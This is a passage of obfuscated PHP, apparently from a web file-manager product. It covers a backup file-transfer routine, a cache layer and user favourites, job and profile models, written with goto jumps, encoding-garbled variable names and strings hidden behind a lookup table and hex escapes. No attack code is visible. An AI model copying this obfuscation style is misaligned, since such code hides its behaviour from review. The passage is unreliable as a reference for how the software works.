Model($_SERVER[¢ÌÛ][741])->where($EÆ«ÀŞÂ²Ğ)->sum($_SERVER[¢ÌÛ][77]); $bÅ˜¸÷ç‰ = new TaskFileTransfer($_SERVER[¢ÌÛ][759], $_SERVER[¢ÌÛ][736], $AŠ‚ÎÍäš, LNG($_SERVER[¢ÌÛ][737]) . $_SERVER[¢ÌÛ][738] . LNG($_SERVER[¢ÌÛ][760])); goto ešèõ¢à“«; FÌ²÷–²æÎ: $B¿¾å½¡¶É = !0; $FĞµìï½ô = $this->storeIds(); $eŸ·ÅÊ†îâ = 1; goto e­­Ô¯¥ë; dÑ‚æíÄç¨: $CŸ’²Òˆï = array($_SERVER[¢ÌÛ][773] => 1, $_SERVER[¢ÌÛ][474] => time(), $_SERVER[¢ÌÛ][731] => 1, $_SERVER[¢ÌÛ][770] => $CÖæÛÃ„§æ, $_SERVER[¢ÌÛ][762] => $B¨ë‚Á†İ‡, $_SERVER[¢ÌÛ][761] => $AŠ‚ÎÍäš); if ($D¼÷ÒÆ½¬Ò) { $CŸ’²Òˆï[$_SERVER[¢ÌÛ][771]] = $Fè¸÷ÕÌ; $CŸ’²Òˆï[$_SERVER[¢ÌÛ][772]] = $E´èÑèò•; } Backup::set($CŸ’²Òˆï); goto CçóÄÉ×Ì; ešèõ¢à“«: $bÅ˜¸÷ç‰->task[$_SERVER[¢ÌÛ][721]] = $B¨ë‚Á†İ‡; $CŸ’²Òˆï = array($_SERVER[¢ÌÛ][761] => $AŠ‚ÎÍäš, $_SERVER[¢ÌÛ][762] => $B¨ë‚Á†İ‡); Backup::set($CŸ’²Òˆï); goto FÌ²÷–²æÎ; e­­Ô¯¥ë: $CÅÔÄ¯„‘ = 1000; $E¥á‚›©Œé = $D¼÷ÒÆ½¬Ò = 0; $cõ…Š¯§† = array(); goto D¯Õô´Âš; D¯Õô´Âš: $E´èÑèò• = $Fè¸÷ÕÌ = 0; do { $eŒ¼£˜Ñ…Í = $_SERVER[¢ÌÛ][763]; $Bò¯©®–Ô = Model($_SERVER[¢ÌÛ][741])->where($EÆ«ÀŞÂ²Ğ)->field($eŒ¼£˜Ñ…Í)->order($_SERVER[¢ÌÛ][764])->selectPage($CÅÔÄ¯„‘, $eŸ·ÅÊ†îâ); $DéëÀ‚Ç› = !empty($Bò¯©®–Ô[$_SERVER[¢ÌÛ][363]]) ? $Bò¯©®–Ô[$_SERVER[¢ÌÛ][363]] : array(); foreach ($DéëÀ‚Ç› as $e©å×³µù) { goto D’˜á¡™¨÷; bÜÍ¬«®Î: if (IO::exist($aå˜ŒÊ®£ƒ)) { $bÅ˜¸÷ç‰->updateFileEnd($e©å×³µù[$_SERVER[¢ÌÛ][28]], $e©å×³µù[$_SERVER[¢ÌÛ][77]]); } else { $aå˜ŒÊ®£ƒ = get_path_father($aå˜ŒÊ®£ƒ); IO::mkdir($aå˜ŒÊ®£ƒ); if (!IO::copy($càì –±ÃÃ, $aå˜ŒÊ®£ƒ, $_SERVER[¢ÌÛ][767])) { write_log($_SERVER[¢ÌÛ][768] . $càì –±ÃÃ . $_SERVER[¢ÌÛ][769] . $aå˜ŒÊ®£ƒ . $_SERVER[¢ÌÛ][503], $_SERVER[¢ÌÛ][736]); $B¿¾å½¡¶É = !1; break; } } $CÖæÛÃ„§æ = $e©å×³µù[$_SERVER[¢ÌÛ][445]]; $D¼÷ÒÆ½¬Ò += 1; goto A‘Õ…Ç¤ê; Cƒ–›­¯½İ: if ($E¥á‚›©Œé >= 1024 * 1024 * 100) { $CŸ’²Òˆï = array($_SERVER[¢ÌÛ][770] => $CÖæÛÃ„§æ, $_SERVER[¢ÌÛ][771] => $Fè¸÷ÕÌ, $_SERVER[¢ÌÛ][772] => $E´èÑèò•); Backup::set($CŸ’²Òˆï); $E¥á‚›©Œé = $D¼÷ÒÆ½¬Ò = 0; } goto EòÁàİ­ë©; A‘Õ…Ç¤ê: $E¥á‚›©Œé += $e©å×³µù[$_SERVER[¢ÌÛ][77]]; $Fè¸÷ÕÌ += 1; $E´èÑèò• += $e©å×³µù[$_SERVER[¢ÌÛ][77]]; goto Cƒ–›­¯½İ; D’˜á¡™¨÷: if (!$this->_fileExist($e©å×³µù, $cõ…Š¯§†, $FĞµìï½ô)) { $AŠ‚ÎÍäš -= 1; $B¨ë‚Á†İ‡ -= (int) $e©å×³µù[$_SERVER[¢ÌÛ][77]]; write_log("\x66\x69\x6c\145\x20\156\157\164\40\x65\x78\x69\163\164\x2e\x66\x69\x6c\145\111\104\72{$e©å×³µù[$_SERVER[¢ÌÛ][445]]}\54\x20\x70\x61\x74\150\x3a{$e©å×³µù[$_SERVER[¢ÌÛ][75]]}", $_SERVER[¢ÌÛ][765]); continue; } $càì –±ÃÃ = $e©å×³µù[$_SERVER[¢ÌÛ][75]]; $aå˜ŒÊ®£ƒ = "\x7b\151\157\x3a{$EÜ™‹¸è“ã[$_SERVER[¢ÌÛ][714]]}\x7d" . substr($càì –±ÃÃ, strlen("\173\151\157\72{$e©å×³µù[$_SERVER[¢ÌÛ][766]]}\175")); goto bÜÍ¬«®Î; EòÁàİ­ë©: } $fÌò´Ç¬´… = count($DéëÀ‚Ç›); $eŸ·ÅÊ†îâ++; } while ($fÌò´Ç¬´… == $CÅÔÄ¯„‘); $bÅ˜¸÷ç‰->end(); goto dÑ‚æíÄç¨; Cñà¾èÍØ: } private function _fileExist($e“‹œ–ÅÃ¦, &$a«Şª‹§£î, $b„·µóàî“) { goto BÍ¦³¾Äá; f³‚ÚÕ÷Òµ: if (IO::exist($eÚùÇÔĞ‘¹)) { $a«Şª‹§£î[] = $e“‹œ–ÅÃ¦[$b×º™ù¶¼Ñ[445]]; return !1; } $dğÉ§»Ù = array($b×º™ù¶¼Ñ[766] => $e“‹œ–ÅÃ¦[$b×º™ù¶¼Ñ[766]], $b×º™ù¶¼Ñ[75] => array($b×º™ù¶¼Ñ[375], "{$eÚùÇÔĞ‘¹}\45")); $A¼­ŒëïŒ­ = Model($b×º™ù¶¼Ñ[741])->where($dğÉ§»Ù)->field($b×º™ù¶¼Ñ[446])->select(); goto AĞœÇñŞÇ‰; AĞœÇñŞÇ‰: $a«Şª‹§£î = array_merge($a«Şª‹§£î, array_to_keyvalue($A¼­ŒëïŒ­, $b×º™ù¶¼Ñ[33], $b×º™ù¶¼Ñ[445])); return !1; goto cÑ­ª—¿§; D‚ÚÅï¬ ´: if (!in_array($e“‹œ–ÅÃ¦[$b×º™ù¶¼Ñ[766]], $b„·µóàî“)) { return !1; } if (IO::exist($FÅœ™„‹¡)) { return !0; } $eÚùÇÔĞ‘¹ = get_path_father($FÅœ™„‹¡); goto f³‚ÚÕ÷Òµ; BÍ¦³¾Äá: $b×º™ù¶¼Ñ =& $_SERVER[¢ÌÛ]; $FÅœ™„‹¡ = $e“‹œ–ÅÃ¦[$b×º™ù¶¼Ñ[75]]; if (in_array($e“‹œ–ÅÃ¦[$b×º™ù¶¼Ñ[445]], $a«Şª‹§£î)) { return !1; } goto D‚ÚÅï¬ ´; cÑ­ª—¿§: } private function _fileFilter($f¸‚ëÛÅÒÚ) { $B·®Ç—İâê =& $_SERVER[¢ÌÛ]; if (empty($f¸‚ëÛÅÒÚ)) { return; } $Eƒ†–ëÃ»˜ = array($B·®Ç—İâê[445] => array($B·®Ç—İâê[7], array_unique($f¸‚ëÛÅÒÚ))); $DÆ¦Î–ä÷› = Model($B·®Ç—İâê[774])->where($Eƒ†–ëÃ»˜)->field($B·®Ç—İâê[396])->select(); foreach ($DÆ¦Î–ä÷› as $DìÕ­©¾ƒù) { Model($B·®Ç—İâê[774])->remove($DìÕ­©¾ƒù[$B·®Ç—İâê[396]], !1); } } private function storeIds() { $FÙà ´ŠÃ =& $_SERVER[¢ÌÛ]; $C…™±Öã© = Model($FÙà ´ŠÃ[726])->listData(); $bäãÅÖ«Ø = array(); $aêšŞ™Ğ²’ = $GLOBALS[$FÙà ´ŠÃ[6]][$FÙà ´ŠÃ[87]][$FÙà ´ŠÃ[775]]; foreach ($C…™±Öã© as $Fõ…ºƒ¹ç°) { $aÜç„£–Â´ = strtolower($Fõ…ºƒ¹ç°[$FÙà ´ŠÃ[93]]); if (!isset($aêšŞ™Ğ²’[$aÜç„£–Â´])) { continue; } $EÕƒ•µ = $FÙà ´ŠÃ[71] . (isset($aêšŞ™Ğ²’[$aÜç„£–Â´]) ? $aêšŞ™Ğ²’[$aÜç„£–Â´] : ucfirst($aÜç„£–Â´)); if (!class_exists($EÕƒ•µ)) { continue; } $bäãÅÖ«Ø[] = $Fõ…ºƒ¹ç°[$FÙà ´ŠÃ[385]]; } return $bäãÅÖ«Ø; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto C«ª…²š£¸; bË¢àì ’µ: switch ($Eˆâ¢¦öç[$dÒÛµÓÜ˜‡[776]]) { case $dÒÛµÓÜ˜‡[17]: self::$handle = Model($dÒÛµÓÜ˜‡[778]); break; case $dÒÛµÓÜ˜‡[779]: self::$handle = new CacheRedis($b¸´Ÿæ¿Şö, $d´§šÈá¸É); break; case $dÒÛµÓÜ˜‡[780]: self::$handle = new CacheMemcached($b¸´Ÿæ¿Şö, $d´§šÈá¸É); break; case $dÒÛµÓÜ˜‡[173]: self::$handle = new CacheFile($b¸´Ÿæ¿Şö, $d´§šÈá¸É); break; default: break; } return self::$handle; goto FÆŸ”‹İá; C«ª…²š£¸: $dÒÛµÓÜ˜‡ =& $_SERVER[¢ÌÛ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto bİ¾À×Œİ; bİ¾À×Œİ: $Eˆâ¢¦öç = $GLOBALS[$dÒÛµÓÜ˜‡[6]][$dÒÛµÓÜ˜‡[345]]; $b¸´Ÿæ¿Şö = $Eˆâ¢¦öç[$Eˆâ¢¦öç[$dÒÛµÓÜ˜‡[776]]]; $d´§šÈá¸É = $Eˆâ¢¦öç[$dÒÛµÓÜ˜‡[777]]; goto bË¢àì ’µ; FÆŸ”‹İá: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($bí’˜Ô‘Õº) { if (is_array($bí’˜Ô‘Õº) || is_object($bí’˜Ô‘Õº)) { $bí’˜Ô‘Õº = json_encode($bí’˜Ô‘Õº); } $bí’˜Ô‘Õº = rawurlencode($bí’˜Ô‘Õº); return md5(KOD_SITE_ID . $_SERVER[¢ÌÛ][70] . $bí’˜Ô‘Õº); } public static function get($Dª°¬¾µÀ¹) { $e÷À™ã˜å = self::key($Dª°¬¾µÀ¹); if (!isset(self::$memoryCache[$e÷À™ã˜å])) { $aÃí¦Ôñ• = self::init()->get($e÷À™ã˜å); self::$memoryCache[$e÷À™ã˜å] = unserialize($aÃí¦Ôñ•); } return self::$memoryCache[$e÷À™ã˜å]; } public static function set($D’½¥©É‚‰, $BÌæŒ™ÁæÊ, $cÀÓ÷°Œ®Ø = false) { goto Câ’µ›Š¾é; A‚÷Èôïïâ: CacheLock::unlock($D’½¥©É‚‰); return $a§‘ÖÄã÷Á; goto f‡Êµƒ; Câ’µ›Š¾é: $f„§Ş–«åÇ = self::key($D’½¥©É‚‰); if (isset(self::$memoryCache[$f„§Ş–«åÇ]) && self::$memoryCache[$f„§Ş–«åÇ] === $BÌæŒ™ÁæÊ) { return !0; } if ($cÀÓ÷°Œ®Ø === 0) { self::$memoryCache[$f„§Ş–«åÇ] = $BÌæŒ™ÁæÊ; return !0; } goto c¶×¸“É¼¦; c¶×¸“É¼¦: CacheLock::lock($D’½¥©É‚‰); $a§‘ÖÄã÷Á = self::init()->set($f„§Ş–«åÇ, serialize($BÌæŒ™ÁæÊ), $cÀÓ÷°Œ®Ø); self::$memoryCache[$f„§Ş–«åÇ] = $BÌæŒ™ÁæÊ; goto A‚÷Èôïïâ; f‡Êµƒ: } public static function remove($A˜Ø¾••Ğ) { goto Fó‡ÕçäˆÑ; cÛºñ¶†ƒ: CacheLock::lock($A˜Ø¾••Ğ); $FÁˆÇ…÷ = self::init()->remove($eÊ•É­Â•); CacheLock::unlock($A˜Ø¾••Ğ); goto AˆˆŞ´Âà¼; Fó‡ÕçäˆÑ: $eÊ•É­Â• = self::key($A˜Ø¾••Ğ); unset(self::$memoryCache[$eÊ•É­Â•]); self::clearTimeout(); goto cÛºñ¶†ƒ; AˆˆŞ´Âà¼: return $FÁˆÇ…÷; goto FÂÊàİ¥³; FÂÊàİ¥³: } public static function removeMemory($f­«Ì’„ø) { $fõêì†¡óŒ = self::key($f­«Ì’„ø); unset(self::$memoryCache[$fõêì†¡óŒ]); } public static function clearMemory($fø¼¢øßô = false) { if ($fø¼¢øßô) { $fø¼¢øßô = self::key($fø¼¢øßô); unset(self::$memoryCache[$fø¼¢øßô]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¢ÌÛ][781])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¢ÌÛ][782])) { self::init()->clearTimeout(); } } } goto B¶§„ß¯à; FÓÃˆŞ¢Ô: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\146\x61\x76"; protected function cacheFunctionAlias($CÀç‚Š¥´¯) { $cñ¿‡àÇÌ =& $_SERVER[¢ÌÛ]; return array($cñ¿‡àÇÌ[1757] => array(USER_ID, $cñ¿‡àÇÌ[2070])); } protected function listData() { $f›ê‡êàŠ =& $_SERVER[¢ÌÛ]; $B·Ë£ëĞà· = array($f›ê‡êàŠ[1490] => USER_ID, $f›ê‡êàŠ[461] => 0); $bÙàç é¸¢ = $f›ê‡êàŠ[2071]; $Eœ´ÜÛ¨š® = $this->field($bÙàç é¸¢)->where($B·Ë£ëĞà·)->order($f›ê‡êàŠ[2072])->select(); return $Eœ´ÜÛ¨š® ? $Eœ´ÜÛ¨š® : array(); } protected function resetCache() { } protected function listView() { goto DíèÚ¤±Ì; b…íïç¬ğ: $cç›‚ƒ‹ó» = array($AœÉ¹ØÚ˜×[410] => array($AœÉ¹ØÚ˜×[411], $EßÙò‚½´•)); $dÛÚóÌ§„· = Model($AœÉ¹ØÚ˜×[774])->listSource($cç›‚ƒ‹ó», $aÏ°Ú•ÁÇá); $dÛÚóÌ§„· = array_merge($dÛÚóÌ§„·[$AœÉ¹ØÚ˜×[73]], $dÛÚóÌ§„·[$AœÉ¹ØÚ˜×[74]]); goto cğçšôÜğÆ; FõáÚÚ½ß: $EßÙò‚½´• = array_to_keyvalue($fîö®öíìô, $AœÉ¹ØÚ˜×[33], $AœÉ¹ØÚ˜×[75]); if (!$EßÙò‚½´•) { return $A‡¸ĞĞ†æâ; } $aÏ°Ú•ÁÇá = 2000; goto b…íïç¬ğ; cğçšôÜğÆ: $dÛÚóÌ§„· = array_to_keyvalue($dÛÚóÌ§„·, $AœÉ¹ØÚ˜×[396]); foreach ($A‡¸ĞĞ†æâ as $C¡Ş–¼ğ¼Ü => $E¥Ä«ˆÙÛÆ) { $e”‡ª¥Âá = $dÛÚóÌ§„·[$E¥Ä«ˆÙÛÆ[$AœÉ¹ØÚ˜×[75]]]; $e”‡ª¥Âá = $e”‡ª¥Âá ? $e”‡ª¥Âá : array(); $A‡¸ĞĞ†æâ[$C¡Ş–¼ğ¼Ü] = array_merge($e”‡ª¥Âá, $E¥Ä«ˆÙÛÆ); } return $A‡¸ĞĞ†æâ; goto aã”î¸¼; DíèÚ¤±Ì: $AœÉ¹ØÚ˜× =& $_SERVER[¢ÌÛ]; $A‡¸ĞĞ†æâ = $this->listData(); $fîö®öíìô = array_filter_by_field($A‡¸ĞĞ†æâ, $AœÉ¹ØÚ˜×[29], $AœÉ¹ØÚ˜×[409]); goto FõáÚÚ½ß; aã”î¸¼: } protected function addFav($FªãË¯ì•, $E…¢Á«ÄçÒ = '', $DíĞ„„Ä›Ö = "\163\x6f\x75\162\x63\x65") { goto E¬È…‚ğ²; f£¨’á˜âŞ: return $this->add($bâääîßÃï); goto aË–è¬›˜; E¬È…‚ğ²: $e¢Ù•£Ëö =& $_SERVER[¢ÌÛ]; $B†¹îŒËğ– = array($e¢Ù•£Ëö[1490] => USER_ID, $e¢Ù•£Ëö[461] => 0, $e¢Ù•£Ëö[415] => $DíĞ„„Ä›Ö, $e¢Ù•£Ëö[414] => $FªãË¯ì•); if ($this->where($B†¹îŒËğ–)->find()) { return !1; } goto FƒÆ¤Äê·ì; d­½§ø¯ì›: if (!$E…¢Á«ÄçÒ && $DíĞ„„Ä›Ö == $e¢Ù•£Ëö[409]) { $bòìÏøæÌ = Model($e¢Ù•£Ëö[1178])->where(array($e¢Ù•£Ëö[410] => $FªãË¯ì•))->find(); if (!$bòìÏøæÌ) { return !1; } $E…¢Á«ÄçÒ = $bòìÏøæÌ[$e¢Ù•£Ëö[28]]; } $E…¢Á«ÄçÒ = $this->getAutoName($E…¢Á«ÄçÒ); $bâääîßÃï = array($e¢Ù•£Ëö[1490] => USER_ID, $e¢Ù•£Ëö[461] => 0, $e¢Ù•£Ëö[413] => $E…¢Á«ÄçÒ, $e¢Ù•£Ëö[414] => $FªãË¯ì•, $e¢Ù•£Ëö[415] => $DíĞ„„Ä›Ö, $e¢Ù•£Ëö[1661] => $Dç±›Öó + 1); goto f£¨’á˜âŞ; FƒÆ¤Äê·ì: $B†¹îŒËğ– = array($e¢Ù•£Ëö[1490] => USER_ID, $e¢Ù•£Ëö[461] => 0); $Dç±›Öó = $this->where($B†¹îŒËğ–)->max($e¢Ù•£Ëö[1680]); if (!$Dç±›Öó) { $Dç±›Öó = 0; } goto d­½§ø¯ì›; aË–è¬›˜: } protected function remove($CÄÆáíÓ‰æ) { $bî£ù‚Ó­é =& $_SERVER[¢ÌÛ]; $fŞŸõ¹Šœ™ = array($bî£ù‚Ó­é[1490] => USER_ID, $bî£ù‚Ó­é[412] => $CÄÆáíÓ‰æ); return $this->where($fŞŸõ¹Šœ™)->delete(); } protected function removeByName($bíÇæÜïæ²) { $aØ®¿ù²·‘ =& $_SERVER[¢ÌÛ]; $AÓ…»§÷® = array($aØ®¿ù²·‘[1490] => USER_ID, $aØ®¿ù²·‘[413] => $bíÇæÜïæ², $aØ®¿ù²·‘[461] => 0); return $this->where($AÓ…»§÷®)->delete(); } protected function rename($EöÒß—ã«, $Eõ„Ğ˜„¸ˆ) { $EÛŸë·•®á =& $_SERVER[¢ÌÛ]; if ($EöÒß—ã« == $Eõ„Ğ˜„¸ˆ) { return !1; } $BàÇì…±İ· = $this->getAutoName($Eõ„Ğ˜„¸ˆ); if ($Eõ„Ğ˜„¸ˆ != $BàÇì…±İ·) { return !1; } $b°…¢¹ï‰ = array($EÛŸë·•®á[1490] => USER_ID, $EÛŸë·•®á[461] => 0, $EÛŸë·•®á[28] => $EöÒß—ã«); return $this->where($b°…¢¹ï‰)->save(array($EÛŸë·•®á[28] => $Eõ„Ğ˜„¸ˆ)); } protected function resetSort($D²…ÀŞÍù) { $DÛóœî•Ê =& $_SERVER[¢ÌÛ]; $D²…ÀŞÍù = is_array($D²…ÀŞÍù) ? $D²…ÀŞÍù : array(); $FÌ†àé£¶Ê = array($DÛóœî•Ê[1490] => USER_ID); for ($DÁ‰¾ ÅÃÀ = 0; $DÁ‰¾ ÅÃÀ < count($D²…ÀŞÍù); $DÁ‰¾ ÅÃÀ++) { $FÌ†àé£¶Ê[$DÛóœî•Ê[412]] = $D²…ÀŞÍù[$DÁ‰¾ ÅÃÀ]; $this->where($FÌ†àé£¶Ê)->save(array($DÛóœî•Ê[1661] => $DÁ‰¾ ÅÃÀ + 1)); } return !0; } protected function moveTop($b›Œ¢ŞÜØ¼) { goto bŞŠ¾¹Ü‚; dïÓêÎ´“: return $this->resetSort($F¦¹ã–âƒÒ); goto d”Şã”©íˆ; bŞŠ¾¹Ü‚: $B…¢ßÔ”·“ =& $_SERVER[¢ÌÛ]; $a‘ÅìÓ‹¥¸ = array($B…¢ßÔ”·“[1490] => USER_ID, $B…¢ßÔ”·“[461] => 0); $CğÆˆŠ‰–Ş = $this->where($a‘ÅìÓ‹¥¸)->where(array($B…¢ßÔ”·“[28] => $b›Œ¢ŞÜØ¼))->find(); goto aˆ±Œ¤‡Ì; b×ÎœğëŞ×: $DˆÊÑ«Àç = $F¦¹ã–âƒÒ; $F¦¹ã–âƒÒ = array_remove_value($F¦¹ã–âƒÒ, $CğÆˆŠ‰–Ş[$B…¢ßÔ”·“[385]]); array_unshift($F¦¹ã–âƒÒ, $CğÆˆŠ‰–Ş[$B…¢ßÔ”·“[385]]); goto dïÓêÎ´“; aˆ±Œ¤‡Ì: if (!$CğÆˆŠ‰–Ş) { return; } $F¦¹ã–âƒÒ = $this->field($B…¢ßÔ”·“[385])->where($a‘ÅìÓ‹¥¸)->order($B…¢ßÔ”·“[2072])->select(); $F¦¹ã–âƒÒ = array_to_keyvalue($F¦¹ã–âƒÒ, $B…¢ßÔ”·“[33], $B…¢ßÔ”·“[385]); goto b×ÎœğëŞ×; d”Şã”©íˆ: } protected function moveBottom($fÜ†…‰­ÃÒ) { $CŞÇ×çï” =& $_SERVER[¢ÌÛ]; $cŒá¼çê«‘ = array($CŞÇ×çï”[1490] => USER_ID, $CŞÇ×çï”[461] => 0); $a¥ÕµâƒËİ = $this->where($cŒá¼çê«‘)->max($CŞÇ×çï”[1680]); $B„šÖß´§ï = array($CŞÇ×çï”[1680] => $a¥ÕµâƒËİ + 1); return $this->where($cŒá¼çê«‘)->where(array($CŞÇ×çï”[28] => $fÜ†…‰­ÃÒ))->save($B„šÖß´§ï); } private function getAutoName($fËƒÉŞ…­â) { goto D™ŒÈ; D™ŒÈ: $b—‡…ç‰ÚÚ =& $_SERVER[¢ÌÛ]; $cç¢™·•°À = array($b—‡…ç‰ÚÚ[1490] => USER_ID, $b—‡…ç‰ÚÚ[461] => 0); $fÎÛĞöõŞ = $this->field($b—‡…ç‰ÚÚ[28])->where($cç¢™·•°À)->select(); goto aš±Ğ´®Í»; CöÊĞ”èˆÈ: return $fËƒÉŞ…­â . "\x28{$E¿ˆöŒ¢Ëò}\x29"; goto BÁ™ÓŠƒ¯ò; aš±Ğ´®Í»: $fÎÛĞöõŞ = array_to_keyvalue($fÎÛĞöõŞ, $b—‡…ç‰ÚÚ[33], $b—‡…ç‰ÚÚ[28]); if (!$fÎÛĞöõŞ || !in_array($fËƒÉŞ…­â, $fÎÛĞöõŞ)) { return $fËƒÉŞ…­â; } for ($E¿ˆöŒ¢Ëò = 0; $E¿ˆöŒ¢Ëò < count($fÎÛĞöõŞ); $E¿ˆöŒ¢Ëò++) { if (!in_array($fËƒÉŞ…­â . "\50{$E¿ˆöŒ¢Ëò}\x29", $fÎÛĞöõŞ)) { return $fËƒÉŞ…­â . "\50{$E¿ˆöŒ¢Ëò}\x29"; } } goto CöÊĞ”èˆÈ; BÁ™ÓŠƒ¯ò: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\152\157\142\x4c\x69\163\x74"; public $field = array("\156\141\155\x65", "\144\145\x73\143", "\x73\157\x72\164"); const JOB_KEY = "\163\145\x6c\x66\112\x6f\142\x4c\x69\163\164"; public function listData($fÕÏ¦ ¥” = false, $eŞÇÇŒõŒÅ = "\x73\157\162\164", $bğÈ‰¾Œ¤‘ = false) { return parent::listData($fÕÏ¦ ¥”, $eŞÇÇŒõŒÅ, $bğÈ‰¾Œ¤‘); } public function remove($A•ì‹±‚Â) { return parent::remove($A•ì‹±‚Â); } public function add($b¶¢‚âù„æ) { $CÏ›ŸÄøã =& $_SERVER[¢ÌÛ]; if ($this->findByName($b¶¢‚âù„æ[$CÏ›ŸÄøã[28]])) { return !1; } $b¶¢‚âù„æ[$CÏ›ŸÄøã[1680]] = $this->getSort(); return parent::insert($b¶¢‚âù„æ); } private function getSort() { $AÔë¬‘Ÿ…£ =& $_SERVER[¢ÌÛ]; $BÁ÷›êŒÅù = parent::listData(); $bóÖ±Š« = array_to_keyvalue($BÁ÷›êŒÅù, $AÔë¬‘Ÿ…£[33], $AÔë¬‘Ÿ…£[1680]); return empty($bóÖ±Š«) ? 0 : max($bóÖ±Š«) + 1; } public function update($b¿ï‘­¨õÔ, $bÇÑóßš·) { $d¥»¨»äÜ„ =& $_SERVER[¢ÌÛ]; $E…Êª´ò°  = parent::listData($b¿ï‘­¨õÔ); $cãé×¦ = $this->findByName($bÇÑóßš·[$d¥»¨»äÜ„[28]]); if (!$E…Êª´ò°  || $cãé×¦ && $cãé×¦[$d¥»¨»äÜ„[385]] != $E…Êª´ò° [$d¥»¨»äÜ„[385]]) { return !1; } return parent::update($b¿ï‘­¨õÔ, $bÇÑóßš·); } public function setUserJob($fƒÏ‘…ƒ‘¾, $DÎøŞ•™²) { goto dêÛ”§ËÊ«; cßËÁ‚ß’: $eäÏº²Ş†Á = array_to_keyvalue($f¥ÃñĞ§²Š, $eß½ê¶Áğ[28]); $f…ÏöÏÇ = $eß½ê¶Áğ[370]; foreach ($DÎøŞ•™² as $a£©¨Ì•÷˜) { if ($eäÏº²Ş†Á[$a£©¨Ì•÷˜]) { $f…ÏöÏÇ .= $eäÏº²Ş†Á[$a£©¨Ì•÷˜][$eß½ê¶Áğ[385]] . $eß½ê¶Áğ[47]; } else { $B–¬ÉîÂÊŠ = $this->add($a£©¨Ì•÷˜); $f…ÏöÏÇ .= $B–¬ÉîÂÊŠ . $eß½ê¶Áğ[47]; } } goto B‰÷ÖÅ»®µ; dêÛ”§ËÊ«: $eß½ê¶Áğ =& $_SERVER[¢ÌÛ]; if (!is_array($DÎøŞ•™²)) { $DÎøŞ•™² = array($DÎøŞ•™²); } $f¥ÃñĞ§²Š = parent::listData(); goto cßËÁ‚ß’; B‰÷ÖÅ»®µ: $f…ÏöÏÇ = rtrim($f…ÏöÏÇ, $eß½ê¶Áğ[47]); Model($eß½ê¶Áğ[504])->metaSet($fƒÏ‘…ƒ‘¾, self::JOB_KEY, $f…ÏöÏÇ); goto C×ÎêÛÍ; C×ÎêÛÍ: } public function getUserJob($a°„–°­‘‰) { $cåîâ¯â¾å = Model($_SERVER[¢ÌÛ][504])->metaGet($a°„–°­‘‰); return $this->getUserJobInfo($cåîâ¯â¾å[self::JOB_KEY]); } public function getUserJobInfo($AÄÄÇöªî) { goto EÂë¯ã«ËŸ; EÂë¯ã«ËŸ: $fÇº¸—È“ˆ =& $_SERVER[¢ÌÛ]; $DÓÊîÉåŠÌ = explode($fÇº¸—È“ˆ[47], $AÄÄÇöªî); $cµãÁ¡†•– = parent::listData(); goto e¢Ë¨ëµÄù; bœìÛƒº»°: return $A†øÒôÅô®; goto fêù®¾‘ˆÇ; e¢Ë¨ëµÄù: $cµãÁ¡†•– = array_remove_key($cµãÁ¡†•–, $fÇº¸—È“ˆ[192]); $A†øÒôÅô® = array(); foreach ($DÓÊîÉåŠÌ as $fğ±Ğ­¸’œ) { if (isset($cµãÁ¡†•–[$fğ±Ğ­¸’œ])) { $A†øÒôÅô®[] = $cµãÁ¡†•–[$fğ±Ğ­¸’œ]; } } goto bœìÛƒº»°; fêù®¾‘ˆÇ: } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\141\155\x65" => "\165\163\x65\x72\137\x6d\x65\x74\x61", "\x6d\x65\x74\141\x46\151\x65\x6c\x64" => "\x75\x73\145\x72\x49\104"); protected $simpleField = "\x75\x73\x65\162\x49\104\x2c\156\151\143\x6b\x4e\x61\x6d\145\54\x6e\141\155\x65\x2c\x61\x76\x61\164\x61\x72\x2c\163\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($F–†ÚóÀî) { $D‹áÔÎİ¦Ä =& $_SERVER[¢ÌÛ]; $EÔ´’¹¹ï = $D‹áÔÎİ¦Ä[2073]; return array($D‹áÔÎİ¦Ä[1730] => array($F–†ÚóÀî[0], $EÔ´’¹¹ï), $D‹áÔÎİ¦Ä[1732] => array($F–†ÚóÀî[0], $EÔ´’¹¹ï), $D‹áÔÎİ¦Ä[2074] => array($F–†ÚóÀî[0], $EÔ´’¹¹ï)); } protected function getInfo($B‰…Í³´¥§, $F¯ìÁËõã = false) { $f©ÄÌŒ¼à = $this->getInfoSimple($B‰…Í³´¥§); if (!is_array($f©ÄÌŒ¼à)) { return array(); } if ($F¯ìÁËõã) { return $this->_getInfoApply($f©ÄÌŒ¼à); } return $this->cacheFunctionGet($_SERVER[¢ÌÛ][1786], $B‰…Í³´¥§); } protected function getInfoFull($D§Áå““â„, $C©‘İïˆÉ = false) { $Aôà£»‘ = $this->getInfoSimple($D§Áå““â„); if (!is_array($Aôà£»‘)) { return array(); } if ($C©‘İïˆÉ) { return $this->_getInfoApply($Aôà£»‘, !0); return $this->_getInfoApply($Aôà£»‘, !0); } return $this->cacheFunctionGet($_SERVER[¢ÌÛ][2075], $D§Áå““â„); } private function _getInfoApply($d†—ë‹ãŞã, $a±ã–÷¦” = false) { goto cÔæ”ñÓ¿ç; dø³Åô²Ï: $d†—ë‹ãŞã = $this->_listDataApplyItem($d†—ë‹ãŞã); $DŠƒã¤Ø„† = Model($AÕŞÆŒàâß[1178])->metaGet($d†—ë‹ãŞã[$AÕŞÆŒàâß[84]][$AÕŞÆŒàâß[396]]); $d†—ë‹ãŞã[$AÕŞÆŒàâß[2078]] = $a–«™ğ›ö; goto aì˜œ±š§Î; aì˜œ±š§Î: 